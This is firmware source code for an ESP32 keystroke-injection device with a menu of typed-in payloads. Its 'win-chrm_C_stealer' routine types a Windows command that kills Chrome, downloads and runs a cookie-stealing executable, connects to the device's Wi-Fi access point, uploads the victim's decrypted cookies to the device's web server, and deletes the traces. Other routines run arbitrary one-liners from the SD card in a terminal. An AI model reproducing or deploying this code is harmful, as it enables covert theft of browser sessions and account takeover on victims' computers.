#include <FS.h>
#include <WiFi.h>
#include "USB.h"
#include "src/USB/lib/USBHIDKeyboard.h"
#include <ESPAsyncWebServer.h>

#define FILES_DIR "/win-chrm"
String files_dir = "/win-chrm";  
String full_files_dir = "/win-chrm/";
String password = "decrypted-cookies";
String ssid = "AP-0";
USBHIDKeyboard Keyboard;
File root;

AsyncWebServer server(80);

struct MENUL {
  char name[19];
  int command;
};

int current_layout = 0;
void rootPayload0(void);
void demo_android(void);
void demo_ios(void);
void demo_macos(void);
void demo_linux(void);
void demo_windows(void);
void demo_char_test(void);
void custom_linux(void);
void custom_macos(void);
void custom_windows(void);

static MENUL layouts[] = { // edit this to add layouts!
  { TXT_BACK, 5},
  { "de-DE", 1},
  { "en-UK", 2},
  { "en-US", 0},
  { "es-ES", 3},
  { "fr-FR", 4},
  { "it-IT", 6},
  { "pt-BR", 7},
};

int layouts_size = sizeof(layouts) / sizeof (MENUL);

void layouts_menu(int option){ // edit this to add layouts!
    rstOverride = true;
    isSwitching = true;
    current_proc = 25;
    switch(option) {
      case 0:
        current_layout = 0;
        break;
      case 1:
        current_layout = 1;
        break;
      case 2:
        current_layout = 2;
        break;
      case 3:
        current_layout = 3;
        break;
      case 4:
        current_layout = 4;
        break;
      case 5:
        rstOverride = false;
        current_proc = 1;
        break;
      case 6:
        current_layout = 6;
        break;
      case 7:
        current_layout = 7;
        break;
    }
}

static MENUL bumenu[] = { // edit this to add payloads!
  { TXT_BACK, 0},
  { "win-chrm_C_stealer", 1},
  { "custom_linux", 2},
  { "custom_macos", 3},
  { "custom_windows", 4},
  { "char_test", 5},
  { "demo_android", 6},
  { "demo_ios", 7}, // not tested. */ 
  { "demo_linux", 8},
  { "demo_macos", 9},
  { "demo_windows", 10},
};

int bumenu_size = sizeof(bumenu) / sizeof (MENUL);

void payloads_menu(int option){ // edit this to add payloads!
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        current_proc = 24;
        break;
      case 1:
        rootPayload0();
        break;
      case 2:
        custom_linux();
        break;
      case 3:
        custom_macos();
        break;
      case 4:
        custom_windows();
        break;
      case 5:
        demo_char_test();
        break;
      case 6:
        demo_android();
        break;
      case 7:
        demo_ios();
        break; 
      case 8:
        demo_linux();
        break; 
      case 9:
        demo_macos();
        break;
      case 10:
        demo_windows();
        break;
    }
}

void demo_android(){ // 6
    Keyboard.begin(current_layout);
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("android demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Sending payload...");
    delay(2000);

    // To open GUI menu:
    
    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
    // delay(500);
    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('b');
    Keyboard.releaseAll();
    delay(600);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('l');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.writeWLayout("https://github.com/usg-ishimura/m5stick-nemo/");
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press('f');
    Keyboard.release('f');
    /*GUI b
    DELAY 600
    ENTER
    DELAY 1000
    CTRL l
    DELAY 100
    STRING https://github.com/Flipper-XFW/Xtreme-Firmware
    DELAY 100
    ENTER
    DELAY 500
    STRING f*/
    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}

void demo_ios(){ // 7
    Keyboard.begin(current_layout);
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("ios demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Sending payload...");
    delay(2000);

    // To open GUI menu:
    
    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
    // delay(500);
    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('h');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    Keyboard.releaseAll();
    delay(250);
    Keyboard.writeWLayout("https://github.com/usg-ishimura/m5stick-nemo/");
    delay(75);
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(75);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(150);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    /*GUI h
    DELAY 1000
    GUI SPACE
    DELAY 250
    STRING https://github.com/Flipper-XFW/Xtreme-Firmware
    DELAY 75
    TAB
    DELAY 75
    ENTER
    DELAY 150
    ENTER*/
    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}
void demo_linux(){ // 8
    Keyboard.begin(current_layout);
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("linux demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Sending payload...");
    delay(2000); 
    Keyboard.pressRaw(HID_KEY_GUI_LEFT);
    delay(500);
    Keyboard.releaseRaw(HID_KEY_GUI_LEFT); 
    delay(1000);
    Keyboard.writeWLayout("MATE Terminal");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.writeWLayout("curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/NEMO.txt");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}
void demo_macos(){ // 9
    Keyboard.begin(current_layout);
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("macos demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Sending payload...");
    delay(2000);

    // To open GUI menu:
    
    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
    // delay(500);
    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.writeWLayout("terminal");
    Keyboard.pressRaw(HID_KEY_ENTER);
    delay(200);
    Keyboard.releaseRaw(HID_KEY_ENTER);  
    delay(2000);
    Keyboard.writeWLayout("curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/NEMO.txt");
    Keyboard.pressRaw(HID_KEY_ENTER);
    delay(200);
    Keyboard.releaseRaw(HID_KEY_ENTER);  

    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}

void demo_windows(){ // 10
    Keyboard.begin(current_layout);
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("windows demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Sending payload...");
    delay(2000);   

    // To open GUI menu:

    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
    // delay(500);
    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.writeWLayout("cmd");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.writeWLayout("curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/NEMO.txt");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}

void demo_char_test(){ // 5
    Keyboard.begin(current_layout);
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("char test demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Sending payload...");
    delay(2000);

    // To open GUI menu:
    
    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
    // delay(500);
    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   

    Keyboard.writeWLayout(" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz{|}`~");
    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}

String ip2String(const IPAddress& address){
  return String() + address[0] + "." + address[1] + "." + address[2] + "." + address[3];
}

String printDirectory_listing(File dir, int numTabs) {
  String response = "";
  dir.rewindDirectory();
  // for (uint8_t i=0; i<numTabs; i++) {
  //   Serial.print('\t');   // we'll have a nice indentation
  // }
  while(true) {
    File entry =  dir.openNextFile();
    if (!entry) {
    // no more files
    // Serial.println("**nomorefiles**");
    break;
    }
    // Recurse for directories, otherwise print the file size
    // if (entry.isDirectory()) {
    //   printDirectory_listing(entry, numTabs+1);
    // }
    if (!entry.isDirectory()){
      response += String("<a href='") + String(entry.name()) + String("'>") + String(entry.name()) + String("</a>") + String("</br>");
    }
    entry.close();
  }

  return String("List files in <b>/</b>win-chrm:<br>") + response;
}

bool createDir(fs::FS &fs, const char * path){
  Serial.printf("Creating Dir: %s\n", path);
  if(fs.mkdir(path)){
    Serial.println("Dir created/exists");
    return true;
  } else {
    Serial.println("mkdir failed");
    return false;
  }
}

String filename_exists(String filename, int count, String filename_original){
  if(SD.exists(full_files_dir+filename)){
    count++;
    char snum[5];
    // Convert 123 to string [buf]
    itoa(count, snum, 10);
    return filename_exists(snum+String("-")+filename_original, count, filename_original);
  } else {
    return filename;
  }
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
  String logmessage = "Client:" + request->client()->remoteIP().toString() + " " + request->url();
  Serial.println(logmessage);
  String filename_copy = filename;
  if (!index) {
    String toUpload = filename_exists(filename, 0, filename);
    logmessage = "Upload Start: " + String(filename);
    // open the file on first call and store the file handle in the request object
    request->_tempFile = SD.open(full_files_dir+toUpload, FILE_WRITE);
    Serial.println(logmessage);
  }

  if (len) {
    // stream the incoming chunk to the opened file
    request->_tempFile.write(data, len);
    logmessage = "Writing file: " + String(filename) + " index=" + String(index) + " len=" + String(len);
    Serial.println(logmessage);
  }

  if (final) {
    logmessage = "Upload Complete: " + String(filename) + ",size: " + String(index + len);
    // close the file handle as the upload is now done
    request->_tempFile.close();
    Serial.println(logmessage);
    request->redirect("/");
  }
}

IPAddress runPayloadServer(){
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  DISP.println("SSID: "+ssid);
  DISP.println("PSW: "+password);
  server.serveStatic("/", SD, full_files_dir.c_str());
  // Serve the HTML file as the default route
  server.on("/", [](AsyncWebServerRequest *request){
    root = SD.open(files_dir);
    String res = printDirectory_listing(root, 0);
    request->send(200, "text/html", res);
  });

  // Route to handle file upload
  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
        request->send(200);
      }, handleUpload);
  // Start server
  server.begin();

  DISP.println("HTTP server started");
  DISP.print("@ http://");
  DISP.println(IP);
  return IP;
}

void run_payload_setup(){
  Keyboard.begin(current_layout);
  USB.begin();
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  IPAddress IP = runPayloadServer();
  String str = ip2String(IP);

  String cmd = "taskkill /F /IM chrome.exe /T \
& cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\" \
&& curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe \
&& curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml \
&& netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\" \
&& netsh wlan connect name="+ssid+" && .\\GCC-stealer.exe --json-file \
&& timeout /t 5 \
&& curl -X POST -F data=@cookies.json http://"+str+"/upload \
& netsh wlan delete profile "+ssid+" & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";

  const char *cmd_final = cmd.c_str();
  
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println("Sending payload...");
  delay(2000);   
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.writeWLayout("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.writeWLayout(cmd_final);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  DISP.print("done.");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf(TXT_SEL_BACK);
}

void rootPayload0(){ // 1
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
      if(createDir(SD, FILES_DIR)){
        run_payload_setup();
      } else {
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
        DISP.printf(TXT_SEL_BACK);
      }
    }
}

void custom_linux(){ // 2
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
        if (SD.exists("/lnx-payload.txt")) {
          File payloadFile = SD.open("/lnx-payload.txt", "r");
          if (payloadFile) {
              String fileContent = "";
              while (payloadFile.available()) {
                fileContent += (char)payloadFile.read();
              }
              payloadFile.close();
              Keyboard.begin(current_layout);
              USB.begin();
              DISP.fillScreen(BGCOLOR);
              DISP.setCursor(0, 0);
              DISP.setTextColor(BGCOLOR, FGCOLOR);
              DISP.setTextSize(SMALL_TEXT);
              DISP.println("linux custom");
              DISP.setTextColor(FGCOLOR, BGCOLOR);
              DISP.println("Sending payload...");
              delay(2000);  
              Keyboard.pressRaw(HID_KEY_GUI_LEFT);
              delay(500);
              Keyboard.releaseRaw(HID_KEY_GUI_LEFT); 
              delay(1000);
              Keyboard.writeWLayout("MATE Terminal");
              Keyboard.press(KEY_RETURN);
              Keyboard.releaseAll();
              delay(2000);
              Keyboard.writeWLayout(fileContent.c_str());
              Keyboard.press(KEY_RETURN);
              Keyboard.releaseAll();
              DISP.print("done.");
              DISP.printf(TXT_SEL_BACK);
          } 
        } else {
          rstOverride = true;
          isSwitching = false;
          DISP.fillScreen(BGCOLOR);
          DISP.setCursor(0, 0);
          DISP.setTextColor(BGCOLOR, FGCOLOR);
          DISP.setTextSize(SMALL_TEXT);
          DISP.print("/lnx-payload.txt");
          DISP.setTextColor(FGCOLOR, BGCOLOR);
          DISP.print(" doesn't exist in SDCARD, create it and write it one-liner in BASH. Can't continue with the execution...");
          DISP.printf(TXT_SEL_BACK);
        }
    }
}

void custom_macos(){ // 3
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
        if (SD.exists("/osx-payload.txt")) {
          File payloadFile = SD.open("/osx-payload.txt", "r");
          if (payloadFile) {
              String fileContent = "";
              while (payloadFile.available()) {
                fileContent += (char)payloadFile.read();
              }
              payloadFile.close();
              Keyboard.begin(current_layout);
              USB.begin();
              DISP.fillScreen(BGCOLOR);
              DISP.setCursor(0, 0);
              DISP.setTextColor(BGCOLOR, FGCOLOR);
              DISP.setTextSize(SMALL_TEXT);
              DISP.println("macos custom");
              DISP.setTextColor(FGCOLOR, BGCOLOR);
              DISP.println("Sending payload...");
              delay(2000);  
              Keyboard.press(KEY_LEFT_GUI);
              Keyboard.press(KEY_SPACE);
              Keyboard.releaseAll();
              delay(1000);
              Keyboard.writeWLayout("Terminal");
              Keyboard.pressRaw(HID_KEY_ENTER);
              delay(200);
              Keyboard.releaseRaw(HID_KEY_ENTER);  
              delay(2000);
              Keyboard.writeWLayout(fileContent.c_str());
              Keyboard.pressRaw(HID_KEY_ENTER);
              delay(200);
              Keyboard.releaseRaw(HID_KEY_ENTER);  
              DISP.print("done.");
              DISP.printf(TXT_SEL_BACK);
          } 
        } else {
          rstOverride = true;
          isSwitching = false;
          DISP.fillScreen(BGCOLOR);
          DISP.setCursor(0, 0);
          DISP.setTextColor(BGCOLOR, FGCOLOR);
          DISP.setTextSize(SMALL_TEXT);
          DISP.print("/osx-payload.txt");
          DISP.setTextColor(FGCOLOR, BGCOLOR);
          DISP.print(" doesn't exist in SDCARD, create it and write it one-liner in BASH. Can't continue with the execution...");
          DISP.printf(TXT_SEL_BACK);
        }
    }
}

void custom_windows(){ // 4
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
        if (SD.exists("/win-payload.txt")) {
          File payloadFile = SD.open("/win-payload.txt", "r");
          if (payloadFile) {
              String fileContent = "";
              while (payloadFile.available()) {
                fileContent += (char)payloadFile.read();
              }
              payloadFile.close();
              Keyboard.begin(current_layout);
              USB.begin();
              DISP.fillScreen(BGCOLOR);
              DISP.setCursor(0, 0);
              DISP.setTextColor(BGCOLOR, FGCOLOR);
              DISP.setTextSize(SMALL_TEXT);
              DISP.println("windows custom");
              DISP.setTextColor(FGCOLOR, BGCOLOR);
              DISP.println("Sending payload...");
              delay(2000);  
              Keyboard.press(KEY_LEFT_GUI);
              Keyboard.press('r');
              Keyboard.releaseAll();
              delay(1000);
              Keyboard.writeWLayout("powershell");
              Keyboard.press(KEY_RETURN);
              Keyboard.releaseAll();
              delay(2000);
              Keyboard.writeWLayout(fileContent.c_str());
              Keyboard.press(KEY_RETURN);
              Keyboard.releaseAll();
              DISP.print("done.");
              DISP.printf(TXT_SEL_BACK);
          } 
        } else {
          rstOverride = true;
          isSwitching = false;
          DISP.fillScreen(BGCOLOR);
          DISP.setCursor(0, 0);
          DISP.setTextColor(BGCOLOR, FGCOLOR);
          DISP.setTextSize(SMALL_TEXT);
          DISP.print("/win-payload.txt");
          DISP.setTextColor(FGCOLOR, BGCOLOR);
          DISP.print(" doesn't exist in SDCARD, create it and write it one-liner in Powershell. Can't continue with the execution...");
          DISP.printf(TXT_SEL_BACK);
        }
    }
}

void drawmenuL() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = bumenu_size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < bumenu_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",bumenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < bumenu_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",bumenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void drawmenuLO() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = layouts_size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < layouts_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",layouts[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < layouts_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",layouts[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}
